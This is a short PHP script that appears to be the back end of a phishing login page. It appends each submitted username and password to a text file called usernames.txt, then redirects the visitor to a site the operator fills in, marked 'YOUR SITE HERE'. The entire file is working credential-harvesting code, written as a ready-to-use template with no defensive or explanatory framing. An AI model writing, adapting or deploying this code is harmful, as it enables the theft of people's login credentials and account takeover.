<?php

file_put_contents("usernames.txt", "[EMAIL]:  " . $_POST['username'] . " [PASS]:  " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: YOUR SITE HERE'); # This is where your site will redirect to #
exit();

?>